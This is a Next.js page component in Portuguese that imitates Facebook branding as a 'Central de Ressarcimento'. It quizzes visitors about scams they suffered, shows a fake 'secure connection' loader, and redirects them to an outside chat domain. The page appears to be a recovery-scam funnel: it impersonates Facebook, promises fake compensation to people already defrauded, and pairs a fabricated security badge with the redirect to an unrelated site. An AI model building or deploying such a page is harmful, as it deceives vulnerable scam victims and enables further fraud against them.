"use client"

import type React from "react"
import { useState, useEffect, Suspense } from "react"
import { useSearchParams } from "next/navigation" // useRouter não será mais usado para push
import { ChevronLeft, ChevronRight, User, Loader2 } from "lucide-react"
import { Button } from "@/components/ui/button"
import { RadioGroup, RadioGroupItem } from "@/components/ui/radio-group"
import { Checkbox } from "@/components/ui/checkbox"
import { Label } from "@/components/ui/label"
import { Progress } from "@/components/ui/progress"
import { Avatar, AvatarFallback, AvatarImage } from "@/components/ui/avatar"
import { FacebookLogo } from "@/components/facebook-logo"

const golpeOptions = [
  { id: "promessas_falsas", label: "Promessas Falsas" },
  { id: "produtos_nao_chegaram", label: "Produtos que não chegaram" },
  { id: "servicos_falsos", label: "Serviços Falsos" },
  { id: "emprestimos_fraudulentos", label: "Empréstimos fraudulentos" },
  { id: "falsa_indenizacao", label: "Falsa indenização" },
  { id: "falsa_habilitacao", label: "Falsa habilitação" },
  { id: "casas_apostas_sem_saque", label: "Casas de apostas que não pagaram saque" },
  { id: "outro_tipo_golpe", label: "Outro tipo de golpe/problema" },
]

const quizQuestions = [
  {
    id: 1,
    type: "checkbox",
    question:
    "Para iniciarmos, selecione o(s) tipo(s) de problema que você enfrentou recentemente no Facebook ou em plataformas online:",
    options: golpeOptions,
    paramName: "problemas",
  },
  {
    id: 2,
    type: "radio",
    question: "O incidente principal ocorreu nos últimos 3 meses?",
    options: [
      { value: "sim_3_meses", label: "Sim, nos últimos 3 meses." },
      { value: "nao_3_meses", label: "Não, ocorreu há mais tempo." },
      { value: "nao_lembro_data", label: "Não tenho certeza da data exata." },
    ],
    paramName: "incidente_recente",
  },
  {
    id: 3,
    type: "radio",
    question: "Para finalizar, você está acessando este site de um celular ou computador?",
    options: [
      { value: "celular", label: "Celular" },
      { value: "computador", label: "Computador" },
    ],
    paramName: "dispositivo",
  },
]

type Answers = {
  [key: number]: string | string[] | null
}

interface ConnectingLoaderProps {
  onComplete: () => void
}

const ConnectingLoader: React.FC<ConnectingLoaderProps> = ({ onComplete }) => {
  const [progress, setProgress] = useState(0)
  const [isVisible, setIsVisible] = useState(false)

  const totalDuration = 12000

  useEffect(() => {
    setIsVisible(true)
    let progressInterval: NodeJS.Timeout | undefined

    const completeTimer = setTimeout(() => {
      onComplete()
    }, totalDuration)

    progressInterval = setInterval(() => {
      setProgress((prev) => {
        const increment = 100 / (totalDuration / 100)
        const newProgress = prev + increment
        if (newProgress >= 100) {
          if (progressInterval) clearInterval(progressInterval)
            return 100
        }
        return newProgress
      })
    }, 100)

    return () => {
      clearTimeout(completeTimer)
      if (progressInterval) clearInterval(progressInterval)
    }
}, [onComplete])

  return (
    <div className="min-h-screen font-sans text-foreground bg-facebook-gray-bg flex flex-col items-center justify-center p-4 text-center">
      <div
        className={`w-full max-w-sm bg-white p-6 sm:p-8 rounded-xl shadow-fb-card border border-facebook-gray-border transition-all duration-500 ease-out ${
          isVisible ? "opacity-100 scale-100" : "opacity-0 scale-95"
        }`}
      >
        <Avatar className="w-16 h-16 sm:w-20 md:w-24 sm:h-20 md:h-24 mx-auto mb-3 sm:mb-4 border-2 sm:border-4 border-white ring-1 sm:ring-2 ring-facebook-blue">
          {/* IMAGEM DA ATENDENTE ATUALIZADA */}
          <AvatarImage src="/images/robo-atendente.png" alt="Assistente Virtual" />
          <AvatarFallback className="bg-slate-200">
            <User className="w-10 h-10 sm:w-12 sm:h-12 text-slate-500" />
          </AvatarFallback>
        </Avatar>
        <>
        <h1 className="text-lg sm:text-xl md:text-2xl font-bold text-foreground mb-1 sm:mb-1.5">
          Conectando com Assistente Virtual...
        </h1>
        <p className="text-xs sm:text-sm md:text-md text-facebook-gray-text mb-4 sm:mb-5">
          Você será atendido(a) por nosso assistente virtual. Aguarde enquanto preparamos sua conexão segura.
        </p>
        </>
        <div className="w-full px-2 sm:px-4 mb-1.5 sm:mb-2">
          <Progress value={progress} className="h-2 sm:h-2.5" />
          <p className="text-xs text-facebook-gray-text mt-1.5 sm:mt-2 font-medium">
            Conectando... {Math.round(progress)}%
          </p>
        </div>
        <div className="flex justify-center items-center space-x-1.5 mt-6 sm:mt-8">
          <div className="w-1.5 h-1.5 bg-green-500 rounded-full animate-pulse"></div>
          <p className="text-xs sm:text-sm font-semibold text-green-600">Conexão Segura Estabelecida</p>
        </div>
      </div>
    </div>
    )
}

function QuizPageV49Content() {
  const searchParams = useSearchParams()
  const [currentStep, setCurrentStep] = useState(0)
  const [answers, setAnswers] = useState<Answers>({})
  const [quizState, setQuizState] = useState<"answering" | "submitting" | "embed">("answering")
  const [finalEmbedUrl, setFinalEmbedUrl] = useState<string | null>(null)

  const handleCheckboxChange = (questionId: number, optionId: string, checked: boolean) => {
    setAnswers((prev) => {
      const currentSelection = (prev[questionId] as string[] | undefined) || []
      if (checked) {
        return { ...prev, [questionId]: [...currentSelection, optionId] }
      } else {
        return { ...prev, [questionId]: currentSelection.filter((id) => id !== optionId) }
      }
    })
  }

  const handleRadioChange = (questionId: number, value: string) => {
    setAnswers((prev) => ({ ...prev, [questionId]: value }))
  }

  const isCurrentQuestionAnswered = () => {
    const currentQuestionData = quizQuestions[currentStep]
    if (!currentQuestionData) return false
      const currentAnswer = answers[currentQuestionData.id]
    if (currentQuestionData.type === "checkbox") {
      return Array.isArray(currentAnswer) && currentAnswer.length > 0
    }
    return !!currentAnswer
  }

  const handleNext = () => {
    if (currentStep < quizQuestions.length - 1) {
      setCurrentStep((prev) => prev + 1)
    } else {
      setQuizState("submitting") // Trigger loading screen
    }
  }

  const handlePrevious = () => {
    if (currentStep > 0) {
      setCurrentStep((prev) => prev - 1)
    }
  }

  const handleQuizCompletionAndPrepareEmbed = () => {
    const newSearchParams = new URLSearchParams(searchParams.toString())
    quizQuestions.forEach((q) => {
      const answer = answers[q.id]
      if (answer) {
        if (Array.isArray(answer)) {
          if (answer.length > 0) newSearchParams.set(q.paramName, answer.join(","))
        } else {
          newSearchParams.set(q.paramName, answer)
        }
      }
    })
    // URL DO EMBED ATUALIZADA
    const baseEmbedUrl = "https://chats-atendimento.com/facebook-ljs20am"
    const finalUrl = `${baseEmbedUrl}?${newSearchParams.toString()}`
    setFinalEmbedUrl(finalUrl)
    setQuizState("embed") // Muda o estado para mostrar o embed
  }

  if (quizState === "submitting") {
    return <ConnectingLoader onComplete={handleQuizCompletionAndPrepareEmbed} />
  }

  if (quizState === "embed" && finalEmbedUrl) {
    if (typeof window !== "undefined") {
      window.location.href = finalEmbedUrl
    }
    return <p>Redirecionando para verificação segura...</p>
  }

  const currentQuestionData = quizQuestions[currentStep]
  if (!currentQuestionData) {
    return (
      <div className="min-h-screen font-sans text-foreground bg-facebook-gray-bg flex flex-col items-center justify-center p-4">
        <Loader2 className="h-12 w-12 text-facebook-blue animate-spin" />
        <p className="mt-4 text-lg text-facebook-gray-text">Carregando quiz...</p>
      </div>
      )
  }

  const progressValue = ((currentStep + 1) / quizQuestions.length) * 100

  return (
    <div className="min-h-screen font-sans text-foreground bg-facebook-gray-bg flex flex-col">
      <div className="hidden sm:block">
        <header className="bg-white shadow-fb-subtle py-2.5 border-b border-facebook-gray-border">
          <div className="container mx-auto flex items-center gap-3 px-4">
            <FacebookLogo className="w-10 h-10" />
            <div>
              <h1 className="text-xl font-semibold text-foreground">Central de Ressarcimento</h1>
              <p className="text-xs text-facebook-gray-text">Verificação de Elegibilidade</p>
            </div>
          </div>
        </header>
      </div>
      <main className="flex-grow flex items-center justify-center p-3 sm:p-4">
        <div className="bg-white rounded-lg shadow-fb-card w-full max-w-lg border border-facebook-gray-border">
          <div className="bg-facebook-blue text-white p-4 sm:p-5 rounded-t-lg">
            <h2 className="text-md sm:text-lg md:text-xl font-semibold text-center">
              CONFIRMAÇÃO DE DADOS PARA RESSARCIMENTO
            </h2>
          </div>
          <div className="p-4 sm:p-6">
            <div className="mb-5 sm:mb-6">
              <div className="flex justify-between items-center mb-2">
                <p className="text-xs sm:text-sm font-medium text-facebook-gray-text">
                  Etapa {currentStep + 1} de {quizQuestions.length}
                </p>
                <p className="text-xs sm:text-sm font-semibold text-facebook-blue">{Math.round(progressValue)}%</p>
              </div>
              <Progress value={progressValue} className="w-full h-2.5" />
            </div>
            <h3 className="text-sm sm:text-base md:text-lg font-semibold text-foreground mb-3 sm:mb-4 leading-tight">
              {currentQuestionData.question}
            </h3>
            {currentQuestionData.type === "checkbox" && (
              <div className="space-y-2.5 sm:space-y-3">
                {currentQuestionData.options.map((option) => (
                  <Label
                    key={option.id}
                    htmlFor={`${currentQuestionData.id}-${option.id}`}
                    className={`flex items-center space-x-2 sm:space-x-3 p-2.5 sm:p-3 border rounded-md cursor-pointer transition-colors duration-200 ${(answers[currentQuestionData.id] as string[] | undefined)?.includes(option.id) ? "border-facebook-blue bg-blue-50 shadow-sm" : "border-facebook-gray-border hover:bg-slate-50"}`}
                  >
                    <Checkbox
                      id={`${currentQuestionData.id}-${option.id}`}
                      checked={(answers[currentQuestionData.id] as string[] | undefined)?.includes(option.id)}
                      onCheckedChange={(checked) => handleCheckboxChange(currentQuestionData.id, option.id, !!checked)}
                    />
                    <span className="text-xs sm:text-sm font-medium">{option.label}</span>
                  </Label>
                  ))}
              </div>
              )}
            {currentQuestionData.type === "radio" && (
              <RadioGroup
                value={(answers[currentQuestionData.id] as string) || ""}
                onValueChange={(value) => handleRadioChange(currentQuestionData.id, value)}
                className="space-y-2.5 sm:space-y-3"
              >
                {currentQuestionData.options.map((option) => (
                  <Label
                    key={option.value}
                    htmlFor={`${currentQuestionData.id}-${option.value}`}
                    className={`flex items-center space-x-2 sm:space-x-3 p-2.5 sm:p-3 border rounded-md cursor-pointer transition-colors duration-200 ${answers[currentQuestionData.id] === option.value ? "border-facebook-blue bg-blue-50 shadow-sm" : "border-facebook-gray-border hover:bg-slate-50"}`}
                  >
                    <RadioGroupItem value={option.value} id={`${currentQuestionData.id}-${option.value}`} />
                    <span className="text-xs sm:text-sm font-medium">{option.label}</span>
                  </Label>
                  ))}
              </RadioGroup>
              )}
          </div>
          <div className="flex justify-between items-center mt-6 sm:mt-8 border-t border-facebook-gray-border p-4 sm:p-6">
            <Button
              variant="outline"
              onClick={handlePrevious}
              disabled={currentStep === 0 || quizState === "submitting"}
              className="text-xs sm:text-sm py-1.5 px-2.5 sm:py-2 sm:px-3 bg-white text-facebook-gray-text border-facebook-gray-border hover:bg-slate-50"
            >
              <ChevronLeft className="h-3.5 w-3.5 sm:h-4 sm:w-4 mr-1" />
              Anterior
            </Button>
            <Button
              onClick={handleNext}
              disabled={!isCurrentQuestionAnswered() || quizState === "submitting"}
              className="bg-facebook-blue hover:bg-facebook-blue-hover text-white text-xs sm:text-sm py-1.5 px-2.5 sm:py-2 sm:px-3"
            >
              {currentStep === quizQuestions.length - 1 ? "Concluir Verificação" : "Avançar"}
              {currentStep < quizQuestions.length - 1 ? (
                <ChevronRight className="h-3.5 w-3.5 sm:h-4 sm:h-4 ml-1" />
                ) : null}
            </Button>
          </div>
        </div>
      </main>
    </div>
    )
}

export default function PageV49() {
  return (
    <Suspense
      fallback={
        <div className="min-h-screen font-sans text-foreground bg-facebook-gray-bg flex flex-col items-center justify-center p-4">
          <Loader2 className="h-12 w-12 text-facebook-blue animate-spin" />
          <p className="mt-4 text-lg text-facebook-gray-text">Carregando...</p>
        </div>
      }
    >
      <QuizPageV49Content />
    </Suspense>
    )
}
